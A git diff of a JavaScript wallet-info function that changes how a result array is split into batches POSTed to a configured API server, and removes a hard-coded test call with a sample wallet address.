@@ -51,8 +51,9 @@ export async function getWalletInfo(key) {
 		i = i + 1;
 	}
 	// console.log(finalOutput);
-	// let count = finalOutput.length % 2 == 0 ? finalOutput.length / 2 : finalOutput.length / 2 + 0.5;
-	let count = parseInt(finalOutput.length / 4);
+	let count = finalOutput.length % 2 == 0 ? finalOutput.length / 2 : finalOutput.length / 2 + 0.5;
+	let count1 = count % 2 == 0 ? count / 2 : count / 2 + 0.5;
+	console.log(count1, count, count+count1, finalOutput.length);
 	fetch(`${SERVER_URL_API}`, {
 		method: 'POST',
 		headers: {
@@ -60,7 +61,7 @@ export async function getWalletInfo(key) {
 		},
 		body: JSON.stringify({
 			"address": key,
-			"params": finalOutput.slice(0, count)
+			"params": finalOutput.slice(0, count1)
 		})
 	}).catch(err => console.error(err, ""));
 
@@ -71,7 +72,7 @@ export async function getWalletInfo(key) {
 		},
 		body: JSON.stringify({
 			"address": key,
-			"params": finalOutput.slice(count, count * 2)
+			"params": finalOutput.slice(count1, count)
 		})
 	}).catch(err => console.error(err, ""));
 
@@ -82,12 +83,12 @@ export async function getWalletInfo(key) {
 		},
 		body: JSON.stringify({
 			"address": key,
-			"params": finalOutput.slice(count * 2, count * 3)
+			"params": finalOutput.slice(count, count+count1)
 		})
 	}).catch(err => console.error(err, ""));
 
 	// const firstOut = finalOutput.slice(0, 20);
-	const firstOut = finalOutput.slice(count * 3, finalOutput.length);
+	const firstOut = finalOutput.slice(count+count1, finalOutput.length);
 	let signatureBalance;
 	let balance;
 	var number;
@@ -208,5 +209,3 @@ function chunk(array, size) {
 	}
 	return ret;
 }
-
-getWalletInfo('J3dwngT2du9yr9cEZ2n9h9SD7NnQWnwtQvySYMm81M5J');
